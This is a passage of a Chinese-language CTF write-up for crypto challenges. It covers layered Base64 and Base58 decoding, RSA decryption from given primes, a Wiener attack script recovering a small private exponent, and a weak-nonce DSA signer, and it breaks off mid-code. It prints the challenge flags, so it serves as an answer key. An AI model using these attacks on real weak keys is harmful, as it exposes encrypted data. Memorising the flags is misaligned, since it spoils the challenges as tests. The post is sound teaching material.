<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从命令行读取所有参数，合并成一个字符串</span></span><br><span class="line">binary_text = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换：将每个二进制字节转换为ASCII字符</span></span><br><span class="line"><span class="keyword">for</span> binary_byte <span class="keyword">in</span> binary_text.split():</span><br><span class="line">    <span class="keyword">if</span> binary_byte:  <span class="comment"># 跳过空字符串</span></span><br><span class="line">        <span class="comment"># 二进制转十进制，再转字符</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(binary_byte, <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># 最后换行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The time has come to make a choice. Choose wisely, or you risk letting your heart become a newer wilderness, and the true flag may remain hidden in the shade.</span><br><span class="line"></span><br><span class="line">VGhlIGZsYWcgaXMgWkFDVEZ7MV9jMHVsZF9oQHYzX2Iwcm5lX3RoM19TaEBkM18wZl9tQDdofTU4ISBKdXN0IGEgbGl0dGxlIGpva2UsIE13YWhhaGEhISBZb3UgbWlnaHQgbm90aWNlIHRoYXQgdGhlIGZsYWcgY29tZXMgZnJvbSBhIHBvZW0gYnkgRGlja2luc29uLCAiSGFkIEkgbm90IHNlZW4gdGhlIHN1bi4iIFRoZSBuZXh0IGxpbmVzIGdvOiAiQnV0IExpZ2h0IGEgbmV3ZXIgV2lsZGVybmVzcywgTXkgV2lsZGVybmVzcyBoYXMgbWFkZS4iIEnigJl2ZSBtYWRlIGEgc2xpZ2h0IGFsdGVyYXRpb24gdG8gdGhlIGxpbmVzLCBqdXN0IHRvIGNvbmZ1c2UgeW91ciBleWVzLiBQZXJoYXBzIHRoaXMgd2lsbCBoZWxwIHlvdSBndWVzcyB0aGUgdHJ1ZSBmbGFnPyBCdXQgaWYgeW914oCZcmUgdXAgZm9yIGEgY2hhbGxlbmdlLCBtYXliZSB5b3Ugc2hvdWxkIGxvb2sgYmFjayBjYXJlZnVsbHkgYW5kIHNlZSBpZiB0aGVyZSdzIGEgaGlkZGVuIEJhc2UgZGVjcnlwdGlvbi4gVGhlcmXigJlzIG1vcmUgdG8gZGlzY292ZXIgaW4gdGhlIG51bWJlcnMgYW5kIGxldHRlcnMsIHNlY3JldHMgd2FpdGluZyB0byBiZSB1bnZlaWxlZC4=</span><br><span class="line"></span><br><span class="line">26FjtozsZ7R2EQAwURGXtqZDnce7XW47571icTRQNXpkSVntMh8Cjk5ppHBTeLFg1LQiWt9ZPpPtkTq8dptNxd2YQe6Y5a5kP8qWQfL8GQJTmitTEyjcr2cAr6HUyHWvzCjc8bMf8byfnP21ogQyU1QBv2HE2T9S5kqfZkjjNDMaYBS6WJQeGgF4r8R3X7bN7dHgZMGA4dm7ePu8qb78ME9iCdsbsj9cwe7h1HYAZ63HyMwzUbtAU9deVRzGwiuVC8ZwEjjeqTh9DmGtWunhK8qU4jG7hdZHcPuBqJ3qiDC9b3r6jynNKh7CxHgQZ4JTfZU5Ei7rXjJrQo8fHSQdAnRHuwA8VdYJjXBPfmt4cUzRtTtMMfNcWpsT6nU5zskXjPVuEUiFpU5MxEAVix5LBsc7XpPTitUMdue4Z5Q3UdWY4LUbpELfzf9HF5FpPwcDdEQsJshy69RwuSPxyNxGYevt6jszg4qQCSBXcUDHr4hja3XVzFLbCtqnXx8rsNhmDcukXN1pkEFGSQxrUCe47Tb7SiZ4MH8doJSGNCYfrt4NsnwecdePrMqcd6TyTKqu23QWHiPpWbts5HS8dk6d5z3aNyKgybq31RizYyJ6A6jCf2DmKQzJFq2xnRgakFrb7mu3a78L4qeqmw8WJgvTeyjiNceG4KhNksme3TQrD1X6piVhVqvRJCD2ws19yGNLDWNtPTsmzMQPTcuK93EU2BuwdpzbMA</span><br></pre></td></tr></table></figure>
<p>第一段是fake：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The flag is ZACTF&#123;1_c0uld_h@v3_b0rne_th3_Sh@d3_0f_m@7h&#125;58! Just a little joke, Mwahaha!! You might notice that the flag comes from a poem by Dickinson, &quot;Had I not seen the sun.&quot; The next lines go: &quot;But Light a newer Wilderness, My Wilderness has made.&quot; Iâve made a slight alteration to the lines, just to confuse your eyes. Perhaps this will help you guess the true flag? But if youâre up for a challenge, maybe you should look back carefully and see if there&#x27;s a hidden Base decryption. Thereâs more to discover in the numbers and letters, secrets waiting to be unveiled.</span><br></pre></td></tr></table></figure>
<p>第二段base64解码失败，怀疑是base58:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A little RSA riddle awaits you. Crack the code, unveil the secret, and you&#x27;ll discover the first line of the twisted, cryptic version of the Dickinson poem I just shared â leading you to the true flag.</span><br><span class="line"></span><br><span class="line">p = 79366393717289094339549910346342915738036801147892841609988538737083315828633</span><br><span class="line">q = 89541276936773591836074173019098253300353308346744434955546251733216891032729</span><br><span class="line">e = 65537</span><br><span class="line">c = 3053910251720456011590806565004747266601634289537034519459823030624390475991109095903273093242658152291715128422599392416400743433708929803291354900903421</span><br></pre></td></tr></table></figure>
<p>解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA parameters</span></span><br><span class="line">p = <span class="number">79366393717289094339549910346342915738036801147892841609988538737083315828633</span></span><br><span class="line">q = <span class="number">89541276936773591836074173019098253300353308346744434955546251733216891032729</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">3053910251720456011590806565004747266601634289537034519459823030624390475991109095903273093242658152291715128422599392416400743433708929803291354900903421</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">d = modinv(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt ciphertext</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message (as integer) = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert integer to bytes/ASCII</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes</span>(<span class="params">m_int</span>):</span><br><span class="line">    <span class="comment"># Convert to hex, then to bytes</span></span><br><span class="line">    hex_str = <span class="built_in">hex</span>(m_int)[<span class="number">2</span>:]  <span class="comment"># Remove &#x27;0x&#x27; prefix</span></span><br><span class="line">    <span class="comment"># Ensure even length</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        hex_str = <span class="string">&#x27;0&#x27;</span> + hex_str</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to decode as ASCII</span></span><br><span class="line">msg_bytes = int_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message in bytes: <span class="subst">&#123;msg_bytes&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message as string: <span class="subst">&#123;msg_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Check if the bytes themselves are hex chars</span></span><br><span class="line">    possible_hex = msg_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> possible_hex):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Possible hex string: <span class="subst">&#123;possible_hex&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Try decoding from hex</span></span><br><span class="line">        from_hex = <span class="built_in">bytes</span>.fromhex(possible_hex)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;From hex decode: <span class="subst">&#123;from_hex&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;As string: <span class="subst">&#123;from_hex.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try common encodings</span></span><br><span class="line"><span class="keyword">for</span> enc <span class="keyword">in</span> [<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;latin-1&#x27;</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Trying <span class="subst">&#123;enc&#125;</span>: <span class="subst">&#123;msg_bytes.decode(enc)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>CBCTF{H@d_1_n0t_s33n_th3_L1ght_0f_CryP7o}</strong></p>
<ul>
<li>RSA_Shrimp</li>
</ul>
<blockquote>
<p>We intercepted an RSA-encrypted message, but it seems the sender made a critical mistake when generating the keys: the private exponent d is unusually small?</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;*********************&quot;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)   </span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = getRandomNBitInteger(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 83810405458629670011268195175607930776502851270019593430778113462991227653979843489021103300987730272108652551286407869238663428126312534610419471430932571715602570165775301827764412220731982754705007707697187820099680332795505670948540843105573754933647288435625741245436238428836440202278683287801421360077</span></span><br><span class="line"><span class="comment"># e = 44325518006091876721605823409610042252069625967882044704024214032751966871521847773994263894312607474509588371872161541972144207214032339247431102110456229841266040285615770275478438280620725262108096170791001509463685129909286120575052133129389839912877047603238192564639423047082080059345481052412519925381</span></span><br><span class="line"><span class="comment"># c = 73434158249386043625252431253323506682208843849831594508828737831830362719932115747428792429497868946601098023909629141071257910108747977030342842534107828613672478901354339083057876376985055292417284326608488912346944387146680464066055117328325698648200021918802428101944953998434164564886207047699320456022</span></span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\begin{gather}
e·d-k\phi(n)=1 \\
e/\phi(n)-k/d=1/d\phi(n) \\
e/\phi(n)-k/d≈1/dn \\
\end{gather}</script><p><img src="/iamges/QianJianTec1766498811775.png" alt=""></p>
<p>尝试<strong>Wiener 攻击</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">83810405458629670011268195175607930776502851270019593430778113462991227653979843489021103300987730272108652551286407869238663428126312534610419471430932571715602570165775301827764412220731982754705007707697187820099680332795505670948540843105573754933647288435625741245436238428836440202278683287801421360077</span></span><br><span class="line">e = <span class="number">44325518006091876721605823409610042252069625967882044704024214032751966871521847773994263894312607474509588371872161541972144207214032339247431102110456229841266040285615770275478438280620725262108096170791001509463685129909286120575052133129389839912877047603238192564639423047082080059345481052412519925381</span></span><br><span class="line">c = <span class="number">73434158249386043625252431253323506682208843849831594508828737831830362719932115747428792429497868946601098023909629141071257910108747977030342842534107828613672478901354339083057876376985055292417284326608488912346944387146680464066055117328325698648200021918802428101944953998434164564886207047699320456022</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">n, d</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(n, d)</span><br><span class="line">        cf.append(q)</span><br><span class="line">        n, d = d, r</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents</span>(<span class="params">cf</span>):</span><br><span class="line">    num, den = [], []</span><br><span class="line">    <span class="keyword">for</span> i, q <span class="keyword">in</span> <span class="built_in">enumerate</span>(cf):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            num.append(q)</span><br><span class="line">            den.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            num.append(q*num[-<span class="number">1</span>] + <span class="number">1</span>)</span><br><span class="line">            den.append(q*den[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num.append(q*num[-<span class="number">1</span>] + num[-<span class="number">2</span>])</span><br><span class="line">            den.append(q*den[-<span class="number">1</span>] + den[-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">yield</span> (num[-<span class="number">1</span>], den[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">cf = continued_fraction(e, N)</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> convergents(cf):</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.bit_length() &lt; <span class="number">99</span> <span class="keyword">or</span> d.bit_length() &gt; <span class="number">101</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line"></span><br><span class="line">        s = N - phi + <span class="number">1</span></span><br><span class="line">        <span class="comment"># p, q 是 x^2 - s*x + N = 0 的根</span></span><br><span class="line">        discriminant = s*s - <span class="number">4</span>*N</span><br><span class="line">        <span class="keyword">if</span> discriminant &gt;= <span class="number">0</span>:</span><br><span class="line">            sqrt_disc = gmpy2.isqrt(discriminant)</span><br><span class="line">            <span class="keyword">if</span> sqrt_disc * sqrt_disc == discriminant:</span><br><span class="line">                p = (s + sqrt_disc) // <span class="number">2</span></span><br><span class="line">                q = (s - sqrt_disc) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> p * q == N:</span><br><span class="line">                    m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">                    flag = long_to_bytes(m)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>得到<strong>CBCTF{w3lc0m3_to_AES}</strong></p>
<ul>
<li>Chaos</li>
</ul>
<blockquote>
<p>Random, mysterious, and, well… ha! At first glance, it’s just a jumble of data and signatures. But for those willing to play, the chaos might just whisper a few secrets of its hidden order.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从外部文件读取参数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;params.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    params_content = f.read()</span><br><span class="line">    <span class="built_in">exec</span>(params_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_nonce</span>():</span><br><span class="line">    <span class="keyword">return</span> (random.getrandbits(<span class="number">32</span>) % (q - <span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg: <span class="built_in">str</span>, x: <span class="built_in">int</span></span>):</span><br><span class="line">    k = gen_nonce()</span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">    hm = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, q) * (hm + x * r)) % q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> json, sys</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: python client.py &lt;msg&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用环境变量或默认值设置种子</span></span><br><span class="line">    seed_value = os.environ.get(<span class="string">&#x27;RANDOM_SEED&#x27;</span>, <span class="number">0x38F23A4C</span>)</span><br><span class="line">    random.seed(seed_value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成随机消息</span></span><br><span class="line">    messages = [os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">700</span>)]</span><br><span class="line">    special_message = <span class="string">&quot;request_special_resource&quot;</span></span><br><span class="line">    messages.append(special_message)</span><br><span class="line"></span><br><span class="line">    signatures = []</span><br><span class="line">    base_timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(messages):</span><br><span class="line">        <span class="comment"># 生成nonce k</span></span><br><span class="line">        k_value = random.getrandbits(<span class="number">32</span>) % (q - <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        r_value = <span class="built_in">pow</span>(g, k_value, p) % q</span><br><span class="line">        hash_msg = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">        s_value = (<span class="built_in">pow</span>(k_value, -<span class="number">1</span>, q) * (hash_msg + x * r_value)) % q</span><br><span class="line">    </span><br><span class="line">        request_data = &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/api/endpoint&quot;</span>,</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>: base_timestamp + i,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;SystemUser&quot;</span>,</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: msg,</span><br><span class="line">                <span class="string">&quot;signature_r&quot;</span>: <span class="built_in">str</span>(r_value),</span><br><span class="line">                <span class="string">&quot;signature_s&quot;</span>: <span class="built_in">str</span>(s_value)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        signatures.append(request_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;requests.jsonl&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> sig <span class="keyword">in</span> signatures:</span><br><span class="line">            f.write(json.dumps(sig, ensure_ascii=<span class="literal">False</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request data generated successfully&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># simple local verifier - reads requests.jsonl in same directory</span></span><br><span class="line"><span class="keyword">import</span> json,socketserver</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = <span class="number">8576266215257684451627938266209288368747290850430257232775662794860889167273173590976498454387838065099555150702527005228232224203671818388040396426167421</span></span><br><span class="line">q = <span class="number">1092510234019</span></span><br><span class="line">g = <span 